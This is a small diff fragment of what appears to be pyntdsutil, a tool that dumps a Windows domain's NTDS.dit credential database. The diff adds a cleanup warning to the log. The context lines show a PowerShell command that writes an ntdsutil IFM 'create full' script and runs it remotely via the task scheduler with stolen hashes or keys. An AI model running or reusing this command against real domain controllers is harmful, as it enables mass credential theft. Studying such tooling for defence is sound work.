@@ -441,6 +441,7 @@ class Ntdsutil:
         
         if self.is_admin:
             logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain.upper(), self.target.username, ( "(Admin!)" if self.is_admin  else "")))
+            logging.info("Artifacts must be cleaned up manually if pyntdsutil is abruptly terminated.")
             command = ["powershell.exe -nop Set-Content -Encoding Default -Path '%s' -Value \"ac` i` ntds`r`nifm`r`ncreate` full` %s%s`r`nq`r`nq\"" % (self.command_file, self.tmp_dir, self.dump_location)]
             logging.debug('Writing command input file for ntdsutil.exe to %s' % (self.command_file))
             atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
